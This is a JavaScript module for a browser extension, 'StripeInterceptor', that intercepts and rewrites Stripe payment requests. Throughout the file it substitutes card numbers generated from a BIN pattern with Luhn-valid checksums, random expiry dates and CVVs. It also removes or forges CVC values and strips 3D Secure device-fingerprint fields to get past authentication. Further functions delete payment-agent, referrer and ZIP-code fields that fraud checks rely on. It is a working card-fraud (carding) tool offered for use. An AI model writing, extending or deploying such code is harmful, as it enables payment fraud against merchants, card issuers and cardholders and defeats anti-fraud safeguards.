// ===================================
// STRIPE-INTERCEPTOR.JS
// WebRequest API based Stripe interception
// Handles CVC modification, 3DS bypass, card substitution
// ===================================

const StripeInterceptor = {
  isActive: false,
  settings: {
    cvcModifier: 'generate',  // 'remove', 'generate', 'nothing', 'custom'
    customCvc: '',
    remove3dsFingerprint: true,
    removePaymentAgent: false,
    removeZipCode: false
  },
  activeBin: null,
  generatedCard: null,

  /**
   * Initialize the interceptor
   */
  async init() {
    // Load settings from storage
    const stored = await chrome.storage.local.get([
      'settings_cvcModifier',
      'settings_customCvc',
      'settings_remove3dsFingerprint',
      'settings_removePaymentAgent',
      'settings_removeZipCode',
      'current_bin'
    ]);

    this.settings.cvcModifier = stored.settings_cvcModifier || 'generate';
    this.settings.customCvc = stored.settings_customCvc || '';
    this.settings.remove3dsFingerprint = stored.settings_remove3dsFingerprint !== false;
    this.settings.removePaymentAgent = stored.settings_removePaymentAgent === true;
    this.settings.removeZipCode = stored.settings_removeZipCode === true;
    this.activeBin = stored.current_bin || null;

    console.log('[StripeInterceptor] Initialized with settings:', this.settings);
  },

  /**
   * Start intercepting Stripe requests
   */
  start() {
    if (this.isActive) return;
    this.isActive = true;
    console.log('[StripeInterceptor] Started');
  },

  /**
   * Stop intercepting
   */
  stop() {
    this.isActive = false;
    this.generatedCard = null;
    console.log('[StripeInterceptor] Stopped');
  },

  /**
   * Set active BIN for card generation
   */
  setBin(bin) {
    this.activeBin = bin;
    this.generatedCard = null;  // Reset generated card when BIN changes
    chrome.storage.local.set({ current_bin: bin });
    console.log('[StripeInterceptor] BIN set:', bin);
  },

  /**
   * Update settings
   */
  updateSettings(newSettings) {
    Object.assign(this.settings, newSettings);
    
    // Save to storage
    const toStore = {};
    Object.keys(newSettings).forEach(key => {
      toStore[`settings_${key}`] = newSettings[key];
    });
    chrome.storage.local.set(toStore);
    
    console.log('[StripeInterceptor] Settings updated:', this.settings);
  },

  /**
   * Process request body - main modification logic
   * 
   * @param {string} body - Original request body
   * @param {string} url - Request URL
   * @returns {Object} - { modified: boolean, body: string, info: object }
   */
  processRequestBody(body, url) {
    if (!this.isActive || !body) {
      return { modified: false, body, info: null };
    }

    let modified = false;
    let info = {
      originalCard: null,
      usedCard: null,
      cvcAction: null,
      is3ds: false,
      fingerPrintRemoved: false
    };

    // Parse URL-encoded body
    const params = new URLSearchParams(body);
    
    // Detect payment method
    const isPaymentMethod = url.includes('/payment_methods') || 
                            url.includes('/confirm') ||
                            url.includes('/tokens') ||
                            url.includes('/sources');

    // === CARD SUBSTITUTION ===
    // If we have a BIN and this is a card payment, substitute the card
    if (this.activeBin && isPaymentMethod) {
      const result = this.substituteCard(params, info);
      if (result.modified) {
        modified = true;
      }
    }

    // === CVC MODIFICATION ===
    const cvcResult = this.modifyCvc(params, info);
    if (cvcResult.modified) {
      modified = true;
    }

    // === 3D SECURE BYPASS ===
    if (this.settings.remove3dsFingerprint) {
      const threeDsResult = this.bypass3dsFingerprint(params, info);
      if (threeDsResult.modified) {
        modified = true;
      }
    }

    // === REMOVE PAYMENT AGENT ===
    if (this.settings.removePaymentAgent) {
      const agentResult = this.removePaymentAgent(params, info);
      if (agentResult.modified) {
        modified = true;
      }
    }

    // === REMOVE ZIP CODE ===
    if (this.settings.removeZipCode) {
      const zipResult = this.removeZipCode(params, info);
      if (zipResult.modified) {
        modified = true;
      }
    }

    const newBody = modified ? params.toString() : body;
    return { modified, body: newBody, info };
  },

  /**
   * Substitute card with BIN-generated card
   */
  substituteCard(params, info) {
    // Check if card data exists in request
    const cardNumber = params.get('card[number]') || 
                       params.get('payment_method_data[card][number]');
    
    if (!cardNumber) {
      return { modified: false };
    }

    info.originalCard = this.maskCardNumber(cardNumber);

    // Generate card from BIN if not already generated
    if (!this.generatedCard && this.activeBin) {
      this.generatedCard = this.generateCardFromBin(this.activeBin);
    }

    if (!this.generatedCard) {
      return { modified: false };
    }

    // Replace card number
    if (params.has('card[number]')) {
      params.set('card[number]', this.generatedCard.number);
    }
    if (params.has('payment_method_data[card][number]')) {
      params.set('payment_method_data[card][number]', this.generatedCard.number);
    }

    // Replace expiry
    if (params.has('card[exp_month]')) {
      params.set('card[exp_month]', this.generatedCard.month);
    }
    if (params.has('card[exp_year]')) {
      params.set('card[exp_year]', this.generatedCard.year);
    }
    if (params.has('payment_method_data[card][exp_month]')) {
      params.set('payment_method_data[card][exp_month]', this.generatedCard.month);
    }
    if (params.has('payment_method_data[card][exp_year]')) {
      params.set('payment_method_data[card][exp_year]', this.generatedCard.year);
    }

    info.usedCard = this.maskCardNumber(this.generatedCard.number);
    
    return { modified: true };
  },

  /**
   * Modify CVC based on settings
   */
  modifyCvc(params, info) {
    const cvcKeys = ['card[cvc]', 'payment_method_data[card][cvc]', 'source[card][cvc]'];
    let modified = false;

    for (const key of cvcKeys) {
      if (params.has(key)) {
        const originalCvc = params.get(key);

        switch (this.settings.cvcModifier) {
          case 'remove':
            params.delete(key);
            info.cvcAction = 'removed';
            modified = true;
            break;

          case 'generate':
            // Use generated card's CVV or generate new one
            const newCvc = this.generatedCard?.cvv || this.generateRandomCvc();
            params.set(key, newCvc);
            info.cvcAction = `generated: ${newCvc}`;
            modified = true;
            break;

          case 'custom':
            if (this.settings.customCvc) {
              params.set(key, this.settings.customCvc);
              info.cvcAction = `custom: ${this.settings.customCvc}`;
              modified = true;
            }
            break;

          case 'nothing':
          default:
            info.cvcAction = 'unchanged';
            break;
        }
      }
    }

    return { modified };
  },

  /**
   * Bypass 3D Secure fingerprinting
   * Removes browser fingerprints from three_d_secure[device_data]
   */
  bypass3dsFingerprint(params, info) {
    // Look for three_d_secure[device_data] in various encoded forms
    let deviceDataKey = null;
    let deviceDataValue = null;

    for (const [key, value] of params) {
      if (key.includes('three_d_secure') && key.includes('device_data')) {
        deviceDataKey = key;
        deviceDataValue = value;
        break;
      }
    }

    if (!deviceDataKey || !deviceDataValue) {
      return { modified: false };
    }

    info.is3ds = true;

    try {
      // Decode: URL decode -> Base64 decode -> JSON parse
      let decoded = decodeURIComponent(deviceDataValue);
      let jsonStr = atob(decoded);
      let obj = JSON.parse(jsonStr);

      // Remove fingerprint fields
      delete obj.browser_locale;
      delete obj.timezone;
      delete obj.user_agent;
      delete obj.screen_width;
      delete obj.screen_height;
      delete obj.color_depth;
      delete obj.language;
      delete obj.java_enabled;
      delete obj.javascript_enabled;
      delete obj.time_zone;

      // Re-encode: JSON stringify -> Base64 encode -> URL encode
      let newJson = JSON.stringify(obj);
      let newBase64 = btoa(newJson);
      let newEncoded = encodeURIComponent(newBase64);

      params.set(deviceDataKey, newEncoded);
      info.fingerPrintRemoved = true;

      console.log('[StripeInterceptor] 3DS fingerprint removed');
      return { modified: true };
    } catch (e) {
      console.error('[StripeInterceptor] Failed to process 3DS data:', e);
      return { modified: false };
    }
  },

  /**
   * Remove payment agent data
   */
  removePaymentAgent(params, info) {
    const agentKeys = [
      'payment_user_agent',
      'referrer',
      'client_attribution_metadata[client_session_id]',
      'client_attribution_metadata[merchant_integration_source]',
      'client_attribution_metadata[merchant_integration_subtype]',
      'client_attribution_metadata[merchant_integration_version]'
    ];

    let modified = false;
    for (const key of agentKeys) {
      if (params.has(key)) {
        params.delete(key);
        modified = true;
      }
    }

    return { modified };
  },

  /**
   * Remove ZIP/postal code from billing
   */
  removeZipCode(params, info) {
    const zipKeys = [
      'billing_details[address][postal_code]',
      'card[address_zip]',
      'payment_method_data[billing_details][address][postal_code]'
    ];

    let modified = false;
    for (const key of zipKeys) {
      if (params.has(key)) {
        params.delete(key);
        modified = true;
      }
    }

    return { modified };
  },

  /**
   * Generate card from BIN pattern
   */
  generateCardFromBin(binInput) {
    if (!binInput) return null;

    binInput = binInput.trim();
    const parts = binInput.split('|');
    const binPattern = parts[0].trim();
    const expMonth = parts[1] ? parts[1].trim() : null;
    const expYear = parts[2] ? parts[2].trim() : null;
    const cvvPattern = parts[3] ? parts[3].trim() : null;

    // Generate card number
    let pattern = binPattern.replace(/[^0-9xX]/g, '');
    
    // Pad to 16 if needed
    if (/^\d+$/.test(pattern) && pattern.length < 16) {
      pattern = pattern + 'x'.repeat(16 - pattern.length);
    }

    let cardNumber = '';
    for (let i = 0; i < pattern.length; i++) {
      const char = pattern[i];
      if (char.toLowerCase() === 'x') {
        cardNumber += Math.floor(Math.random() * 10).toString();
      } else {
        cardNumber += char;
      }
    }

    // Fix Luhn check
    cardNumber = this.fixLuhn(cardNumber);

    // Generate expiry
    const month = this.generateMonth(expMonth);
    const year = this.generateYear(expYear);

    // Generate CVV
    const cvv = this.generateCvv(cvvPattern);

    return { number: cardNumber, month, year, cvv };
  },

  /**
   * Fix Luhn checksum
   */
  fixLuhn(cardNumber) {
    const digits = cardNumber.split('').map(Number);
    const len = digits.length;
    
    let sum = 0;
    for (let i = 0; i < len - 1; i++) {
      let digit = digits[i];
      if ((len - 1 - i) % 2 === 1) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
    }

    const checkDigit = (10 - (sum % 10)) % 10;
    return cardNumber.slice(0, -1) + checkDigit.toString();
  },

  generateMonth(month) {
    if (month && /^\d{1,2}$/.test(month)) {
      const m = parseInt(month, 10);
      if (m >= 1 && m <= 12) {
        return m.toString().padStart(2, '0');
      }
    }
    return (Math.floor(Math.random() * 12) + 1).toString().padStart(2, '0');
  },

  generateYear(year) {
    const currentYear = new Date().getFullYear();
    if (year && /^\d{2,4}$/.test(year)) {
      let y = parseInt(year, 10);
      if (y < 100) y += 2000;
      if (y >= currentYear) {
        return (y % 100).toString().padStart(2, '0');
      }
    }
    const randomYear = currentYear + Math.floor(Math.random() * 5) + 1;
    return (randomYear % 100).toString().padStart(2, '0');
  },

  generateCvv(pattern) {
    if (pattern && /^\d{3,4}$/.test(pattern)) {
      return pattern;
    }
    let cvv = '';
    for (let i = 0; i < 3; i++) {
      cvv += Math.floor(Math.random() * 10).toString();
    }
    return cvv;
  },

  generateRandomCvc() {
    return Math.floor(100 + Math.random() * 900).toString();
  },

  maskCardNumber(number) {
    if (!number || number.length < 10) return number;
    return number.substring(0, 6) + '******' + number.substring(number.length - 4);
  }
};

// Export
if (typeof module !== 'undefined' && module.exports) {
  module.exports = StripeInterceptor;
}
